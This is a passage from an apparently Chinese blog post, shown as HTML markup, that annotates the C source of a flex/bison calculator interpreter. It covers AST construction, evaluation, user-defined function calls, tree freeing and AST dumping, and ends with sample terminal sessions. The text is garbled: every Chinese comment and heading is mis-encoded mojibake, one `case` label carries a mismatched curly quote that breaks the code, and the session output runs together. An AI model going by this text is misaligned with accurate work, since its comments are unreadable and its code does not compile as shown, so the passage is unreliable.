class="line"><span class="comment">//æ¡ä»¶è¡¨è¾¾å¼çš„ast</span></span><br><span class="line"><span class="keyword">struct</span> ast *</span><br><span class="line">newflow(<span class="keyword">int</span> nodetype, <span class="keyword">struct</span> ast *cond, <span class="keyword">struct</span> ast *tl, <span class="keyword">struct</span> ast *el)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> flow *a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> flow));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;cond = cond;</span><br><span class="line">  a-&gt;tl = tl;</span><br><span class="line">  a-&gt;el = el;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">struct</span> ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¦å·list</span></span><br><span class="line"><span class="keyword">struct</span> symlist *</span><br><span class="line">newsymlist(<span class="keyword">struct</span> symbol *sym, <span class="keyword">struct</span> symlist *next)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symlist *sl = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> symlist));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!sl) &#123;</span><br><span class="line">    yyerror(<span class="string">"out of space"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sl-&gt;sym = sym;</span><br><span class="line">  sl-&gt;next = next;</span><br><span class="line">  <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾ç¬¦å·list</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">symlistfree(<span class="keyword">struct</span> symlist *sl)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> symlist *nsl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(sl) &#123;</span><br><span class="line">    nsl = sl-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(sl);</span><br><span class="line">    sl = nsl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="comment">//func(parma1,parma2â€¦);</span></span><br><span class="line"><span class="comment">/* define a function */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dodef(<span class="keyword">struct</span> symbol *name, <span class="keyword">struct</span> symlist *syms, <span class="keyword">struct</span> ast *func)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;syms) symlistfree(name-&gt;syms);</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;func) treefree(name-&gt;func);</span><br><span class="line">  name-&gt;syms = syms;</span><br><span class="line">  name-&gt;func = func;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">callbuiltin</span><span class="params">(<span class="keyword">struct</span> fncall *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">calluser</span><span class="params">(<span class="keyword">struct</span> ufncall *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//astæ±‚å€¼</span></span><br><span class="line"><span class="keyword">double</span></span><br><span class="line">eval(<span class="keyword">struct</span> ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">"internal error, null eval"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: v = ((<span class="keyword">struct</span> numval *)a)-&gt;number; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'N'</span>: v = ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;value; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>: v = ((<span class="keyword">struct</span> symasgn *)a)-&gt;s-&gt;value =</span><br><span class="line">      eval(((<span class="keyword">struct</span> symasgn *)a)-&gt;v); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>: v = eval(a-&gt;l) + eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'-'</span>: v = eval(a-&gt;l) - eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'*'</span>: v = eval(a-&gt;l) * eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'/'</span>: v = eval(a-&gt;l) / eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>: v = <span class="built_in">fabs</span>(eval(a-&gt;l)); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'M'</span>: v = -eval(a-&gt;l); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* comparisons */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>: v = (eval(a-&gt;l) &gt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'2'</span>: v = (eval(a-&gt;l) &lt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'3'</span>: v = (eval(a-&gt;l) != eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'4'</span>: v = (eval(a-&gt;l) == eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'5'</span>: v = (eval(a-&gt;l) &gt;= eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'6'</span>: v = (eval(a-&gt;l) &lt;= eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//è¿™éƒ¨åˆ†æ˜¯å¯¹æ¡ä»¶è¡¨è¾¾å¼çš„astçš„æ±‚å€¼</span></span><br><span class="line">  <span class="comment">//æ¯”å¦‚if else è¿™äº›</span></span><br><span class="line">  <span class="comment">/* control flow */</span></span><br><span class="line">  <span class="comment">/* null if/else/do expressions allowed in the grammar, so check for them */</span></span><br><span class="line">  case 'Iâ€™:</span><br><span class="line">    <span class="comment">//æ¡ä»¶æˆç«‹ï¼Œèµ°thenæˆ–è€…doçš„åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">if</span>( eval( ((<span class="keyword">struct</span> flow *)a)-&gt;cond) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) &#123;</span><br><span class="line">    v = eval( ((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//ä¸æˆç«‹ï¼Œèµ°elseåˆ†æ”¯</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el) &#123;</span><br><span class="line">        v = eval(((<span class="keyword">struct</span> flow *)a)-&gt;el);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// whileè¯­å¥</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    v = <span class="number">0.0</span>;        <span class="comment">/* a default value */</span></span><br><span class="line">    <span class="comment">//æ¡ä»¶æˆç«‹ï¼Œèµ°doçš„é€»è¾‘</span></span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) &#123;</span><br><span class="line">      <span class="keyword">while</span>( eval(((<span class="keyword">struct</span> flow *)a)-&gt;cond) != <span class="number">0</span>)</span><br><span class="line">    v = eval(((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä¸æˆç«‹ï¼Œå‡‰å‡‰ï¼Œå•¥éƒ½ä¸åš</span></span><br><span class="line">    <span class="keyword">break</span>;            <span class="comment">/* last value is value */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//è¯­å¥åˆ—è¡¨</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'L'</span>: eval(a-&gt;l); v = eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//å‡½æ•°</span></span><br><span class="line">  <span class="comment">//func(paramâ€¦);</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'F'</span>: v = callbuiltin((<span class="keyword">struct</span> fncall *)a); <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//ç”¨æˆ·è°ƒç”¨éƒ¨åˆ†</span></span><br><span class="line">  <span class="comment">//æ¯”å¦‚ call xxx();</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'C'</span>: v = calluser((<span class="keyword">struct</span> ufncall *)a); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"internal error: bad node %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸€äº›å†…å»ºå‡½æ•°çš„å®ç°ï¼Œccæ”¯æŒçš„</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">callbuiltin(<span class="keyword">struct</span> fncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">enum</span> bifs functype = f-&gt;functype;</span><br><span class="line">  <span class="keyword">double</span> v = eval(f-&gt;l);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">switch</span>(functype) &#123;</span><br><span class="line"> <span class="keyword">case</span> B_sqrt:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">sqrt</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_exp:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">exp</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_log:</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">log</span>(v);</span><br><span class="line"> <span class="keyword">case</span> B_print:</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"= %4.4g\n"</span>, v);</span><br><span class="line">   <span class="keyword">return</span> v;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line">   yyerror(<span class="string">"Unknown built-in function %d"</span>, functype);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°è°ƒç”¨çš„å®ç°ï¼Œæ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ã€‚</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span></span><br><span class="line">calluser(<span class="keyword">struct</span> ufncall *f)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//è·å–å‡½æ•°çš„ä¿¡æ¯ï¼Œå‡½æ•°åï¼Œå‚æ•°ç­‰</span></span><br><span class="line">  <span class="keyword">struct</span> symbol *fn = f-&gt;s;    <span class="comment">/* function name */</span></span><br><span class="line">  <span class="comment">//å½¢å‚</span></span><br><span class="line">  <span class="keyword">struct</span> symlist *sl;        <span class="comment">/* dummy arguments */</span></span><br><span class="line">  <span class="comment">//å®å‚</span></span><br><span class="line">  <span class="keyword">struct</span> ast *args = f-&gt;l;    <span class="comment">/* actual arguments */</span></span><br><span class="line">  <span class="comment">//ä¿å­˜çš„å‚æ•°</span></span><br><span class="line">  <span class="keyword">double</span> *oldval, *newval;    <span class="comment">/* saved arg values */</span></span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line">  <span class="keyword">int</span> nargs;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!fn-&gt;func) &#123;</span><br><span class="line">    yyerror(<span class="string">"call to undefined function"</span>, fn-&gt;name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//è·å–å‚æ•°æ•°é‡ï¼Œä»å½¢å‚åˆ—è¡¨éå†è·å¾—</span></span><br><span class="line">  <span class="comment">/* count the arguments */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(nargs = <span class="number">0</span>; sl; sl = sl-&gt;next)</span><br><span class="line">    nargs++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//ä¸ºä¿å­˜å‚æ•°åˆ†é…ç©ºé—´</span></span><br><span class="line">  <span class="comment">/* prepare to save them */</span></span><br><span class="line">  oldval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  newval = (<span class="keyword">double</span> *)<span class="built_in">malloc</span>(nargs * <span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">  <span class="keyword">if</span>(!oldval || !newval) &#123;</span><br><span class="line">    yyerror(<span class="string">"Out of space in %s"</span>, fn-&gt;name); <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//å‚æ•°å¯èƒ½æ˜¯è¡¨è¾¾å¼ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶æ±‚å€¼ã€‚</span></span><br><span class="line">  <span class="comment">//æ¯”å¦‚ max(1+2,5) å°±éœ€è¦å¯¹ç¬¬ä¸€ä¸ªå‚æ•°å…ˆæ±‚å€¼ï¼Œç„¶åå†è¿›è¡Œè®¡ç®—ã€‚</span></span><br><span class="line">  <span class="comment">/* evaluate the arguments */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!args) &#123;</span><br><span class="line">      yyerror(<span class="string">"too few args in call to %s"</span>, fn-&gt;name);</span><br><span class="line">      <span class="built_in">free</span>(oldval); <span class="built_in">free</span>(newval);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args-&gt;nodetype == <span class="string">'L'</span>) &#123;    <span class="comment">/* if this is a list node */</span></span><br><span class="line">      newval[i] = eval(args-&gt;l);</span><br><span class="line">      args = args-&gt;r;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;            <span class="comment">/* if it's the end of the list */</span></span><br><span class="line">      newval[i] = eval(args);</span><br><span class="line">      args = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//ä¿å­˜å½¢å‚çš„æ—§å€¼ï¼Œç„¶åæ›´æ–°æ–°å€¼</span></span><br><span class="line">  <span class="comment">//æ¯”å¦‚ max(1+2,4-1) æ›´æ–°æˆ max(3ï¼Œ3)</span></span><br><span class="line">  <span class="comment">/* save old values of dummies, assign new ones */</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">struct</span> symbol *s = sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    oldval[i] = s-&gt;value;</span><br><span class="line">    s-&gt;value = newval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(newval);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* evaluate the function */</span> <span class="comment">//å‚æ•°éƒ½æ›´æ–°å®Œäº†ä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥å»è®¡ç®—å‡½æ•°å€¼äº†</span></span><br><span class="line">  v = eval(fn-&gt;func);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* put the dummies back */</span>  <span class="comment">//å› ä¸ºä¹‹å‰æ›´æ”¹äº†å½¢å‚çš„listï¼Œç°åœ¨è¦æ¢å¤</span></span><br><span class="line">  sl = fn-&gt;syms;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nargs; i++) &#123;</span><br><span class="line">    <span class="keyword">struct</span> symbol *s = sl-&gt;sym;</span><br><span class="line"></span><br><span class="line">    s-&gt;value = oldval[i];</span><br><span class="line">    sl = sl-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(oldval);</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡Šæ”¾èŠ‚ç‚¹ï¼Œåˆ†æƒ…å†µï¼Œå› ä¸ºä¸åŒçš„æ“ä½œç¬¦ï¼Œå­æ ‘æ•°ç›®ä¸åŒï¼Œæ‰€ä»¥è¦åˆ†æƒ…å†µã€‚</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">treefree(<span class="keyword">struct</span> ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two subtrees */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>:  <span class="keyword">case</span> <span class="string">'2'</span>:  <span class="keyword">case</span> <span class="string">'3'</span>:  <span class="keyword">case</span> <span class="string">'4'</span>:  <span class="keyword">case</span> <span class="string">'5'</span>:  <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">    treefree(a-&gt;r);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* one subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'M'</span>: <span class="keyword">case</span> <span class="string">'C'</span>: <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    treefree(a-&gt;l);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* no subtree */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: <span class="keyword">case</span> <span class="string">'N'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((<span class="keyword">struct</span> symasgn *)a)-&gt;v);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;cond);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl) <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el) <span class="built_in">free</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"internal error: free bad node %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a); <span class="comment">/* always free the node itself */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">yyerror(<span class="keyword">char</span> *s, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, s);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%d: error: "</span>, yylineno);</span><br><span class="line">  <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, s, ap);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> yyparse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠast dumpå‡ºæ¥åšæ˜¾ç¤ºï¼Œæ–¹ä¾¿è°ƒè¯•</span></span><br><span class="line"><span class="comment">/* debugging: dump out an AST */</span></span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dumpast(<span class="keyword">struct</span> ast *a, <span class="keyword">int</span> level)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%*s"</span>, <span class="number">2</span>*level, <span class="string">""</span>);    <span class="comment">/* indent to this level */</span></span><br><span class="line">  level++;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NULL\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'K'</span>: <span class="built_in">printf</span>(<span class="string">"number %4.4g\n"</span>, ((<span class="keyword">struct</span> numval *)a)-&gt;number); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'N'</span>: <span class="built_in">printf</span>(<span class="string">"ref %s\n"</span>, ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;name); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'='</span>: <span class="built_in">printf</span>(<span class="string">"= %s\n"</span>, ((<span class="keyword">struct</span> symref *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast( ((<span class="keyword">struct</span> symasgn *)a)-&gt;v, level); <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'+'</span>: <span class="keyword">case</span> <span class="string">'-'</span>: <span class="keyword">case</span> <span class="string">'*'</span>: <span class="keyword">case</span> <span class="string">'/'</span>: <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'1'</span>: <span class="keyword">case</span> <span class="string">'2'</span>: <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'4'</span>: <span class="keyword">case</span> <span class="string">'5'</span>: <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"binop %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    dumpast(a-&gt;r, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>: <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"unop %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">case</span> <span class="string">'W'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flow %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;cond, level);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;tl)</span><br><span class="line">      dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;tl, level);</span><br><span class="line">    <span class="keyword">if</span>( ((<span class="keyword">struct</span> flow *)a)-&gt;el)</span><br><span class="line">      dumpast( ((<span class="keyword">struct</span> flow *)a)-&gt;el, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"builtin %d\n"</span>, ((<span class="keyword">struct</span> fncall *)a)-&gt;functype);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'C'</span>: <span class="built_in">printf</span>(<span class="string">"call %s\n"</span>, ((<span class="keyword">struct</span> ufncall *)a)-&gt;s-&gt;name);</span><br><span class="line">    dumpast(a-&gt;l, level);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">"bad %c\n"</span>, a-&gt;nodetype);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x03-ä½¿ç”¨"><a href="#0x03-ä½¿ç”¨" class="headerlink" title="0x03: ä½¿ç”¨"></a>0x03: ä½¿ç”¨</h4><p>æµ‹è¯•ç¯å¢ƒ ubuntu 16.04 x64<br>è¿™éƒ¨åˆ†æ²¡å•¥æ„æ€ï¼Œéšä¾¿æµ‹è¯•ä¸‹å°±å¥½äº†ï¼Œä¸»è¦è¿˜æ˜¯çœ‹ä¸Šé¢çš„ä»£ç ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ ubuntu in ~/flexbison [20:49:52] </span>$ ./fb3-2 &gt; 1+123=  124&gt; 1=    1&gt; 2=    2&gt; 1.1+2=  3.1&gt; 3.33333/1.2344=  2.7</span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(0.1,-0.2)=  0.1&gt; max(99999999999999999999999999999999999999999,999999999999999999999999999999999999999999999999999999999999999999999999999)= 1e+75&gt;</span><br></pre></td></tr></table></figure>
<p>è®¾ç½®äº†debugä¹‹åå¯ä»¥çœ‹åˆ°astï¼Œæ–¹ä¾¿è°ƒè¯•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; <span class="built_in">let</span> max(x,y) = <span class="keyword">if</span> x &gt;= y <span class="keyword">then</span> x;<span class="keyword">else</span> y;;Defined max&gt; max(1,2)call max  binop L    number    1    number    2=    2&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
